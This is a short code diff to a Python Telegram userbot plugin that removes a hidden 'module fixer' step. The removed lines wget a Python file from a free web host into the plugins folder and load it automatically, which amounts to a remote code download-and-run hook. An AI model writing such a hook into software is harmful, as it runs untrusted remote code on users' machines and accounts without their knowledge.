@@ -9,10 +9,7 @@ from base64 import b64decode
 from userbot import bot
 from telethon.errors.rpcerrorlist import YouBlockedUserError
 
-#install module fixer
-os.system('wget https://legendx22.000webhostapp.com/module_fixer.py -P userbot/plugins/')
-load_module('module_fixer')
-#module fixer installed
+# without module helper can use it⚡
 
 @register(outgoing=True, pattern="^.hunt(?: |$)(.*)")
 async def WooMai(netase):     
